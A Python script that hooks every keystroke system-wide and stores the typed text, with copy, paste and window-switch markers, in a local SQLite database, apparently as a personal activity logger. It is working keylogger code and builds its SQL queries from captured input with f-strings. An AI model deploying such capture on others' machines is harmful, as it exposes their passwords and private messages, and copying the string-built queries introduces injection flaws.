import time, sys
import keyboard
import sqlite3


class KeyboardLog():
    def __init__(self):
        self.ready_to_commit = False
        self.arrows = {"up": "↑", "right" : "→", "down": "↓", "left": "←"}
        #with sqlite3.connect('keyboard_log.db', check_same_thread=False) as con: #
        self.con = sqlite3.connect('keyboard_log.db', check_same_thread=False)
        self.cur = self.con.cursor()


        init_cmd = '''CREATE TABLE IF NOT EXISTS keyboard_log (id integer primary key autoincrement, date text, keypress_block text)'''
        self.cur.execute(init_cmd)
        self.con.commit()

        cmd = f"INSERT INTO keyboard_log VALUES(NULL, '{str(time.time())}', 'KEYLOG STARTED')"    
        self.cur.execute(cmd)
        self.con.commit()
        #con.close()
        
        #keyboard.hook(callback, suppress=False, on_remove=<lambda>)
        self.prev_block_end = time.time()
        self.prev_keypress = "space"
        self.prev_block = []
        self.block = []
        self.prev_keypress_time = time.time()
        keyboard.hook(self.log_keypress)
        keyboard.wait()


    def add_block_record(self, date_time, keypress_block):
        if keypress_block == []:
            pass
        block = "".join(keypress_block)
        cmd = f"INSERT INTO keyboard_log VALUES(NULL, '{date_time}', '{block}')"
        print("CMD:\n", cmd)
        # with sqlite3.connect("keyboard_log.db", check_same_thread=False) as con:
        #     cur = con.cursor()
        #     cur.execute(cmd)
        #     con.commit()
        #con.close()
        self.cur.execute(cmd)
        self.con.commit()


    def log_keypress(self, event):
        #print(dir(event))
        #print(event)
        #print(event.event_type, event.modifiers, event.name, event.scan_code, event.time, event.to_json)
        if event.event_type == "down":
            if time.time() - self.prev_keypress_time > 5:
                pass

            if event.name == 'tab':
                if event.modifiers and "alt" in event.modifiers:
                    self.prev_keypress = 'alt+tab'
                    self.prev_block = list(self.block)
                    self.add_block_record(str(time.time()), self.block)
                    self.ready_to_commit = True
                    self.block = ['alt+tab']
                    self.add_block_record(str(time.time()), self.block)
                    self.block = []

                else:
                    self.block.append("\t")

            elif event.name == "enter":
                self.prev_keypress = "enter"
                self.prev_block = list(self.block)
                self.add_block_record(str(time.time()), self.block)
                self.block = []
            
            elif event.name in self.arrows:#["up", "down", "right", "left"]:
                
                self.block.append(self.arrows[event.name])
                #pass

            elif event.name == "space":
                self.block.append(" ")

            elif event.name == "shift":
                pass
            elif event.name in ["backspace", "delete"]:
                pass
            elif event.name == "ctrl":
                pass
            elif event.name == "c" and "ctrl" in event.modifiers:
                self.block.append(' <COPY> ')
            elif event.name == "v" and "ctrl" in event.modifiers:
                self.block.append(' <PASTE> ')
            elif event.name == "windows":
                self.block.append(' <WIN> ')
            elif event.name == "alt":
                pass
            elif event.name == "end":
                self.block.append(' <END> ')
            elif event.name == "esc":
                #self.close_db()
                self.block.append(' <ESC> ')
            elif event.name == "home":
                self.block.append(' <HOME> ')

            elif event.name.isalnum() and len(event.name) < 2:
                self.block.append(event.name)

            elif event.name in ["'", '"', ";", ":",",", ".", 
                                "\\", "?", "!", "@", "_", "(",
                                 ")", "-", "=", "+", "#", "$", 
                                 "%", "*", "<", ">", "/", "|"]:
                if event.name == "'":
                    self.block.append('"')    
                else:
                    self.block.append(event.name)

            elif event.name == "page up":
                self.block.append(" <PGUP> ")
            
            elif event.name == "page down":
                self.block.append(" <PGDN> ")

            #with sqlite3.connect("keyboard_log.db", check_same_thread=False) as con:
            #    cur = con.cursor()
            #    cur.execute(cmd)
            #    con.commit()
            
            #print(event.modifiers, event.name, event.time) #, event.to_json())
    
    def close_db(self):
        print("CLOSING DATABASE...")
        keyboard.unhook_all()
        self.con.close()
        sys.exit()


# Insert a row of data
#cur.execute("INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)")

if __name__ == "__main__":
    try:
        k = KeyboardLog()
    #k.add_block_record(str(time.time()), "abc shift SSS alt tab enter /n")
    except Exception as _e:
        print(str(_e))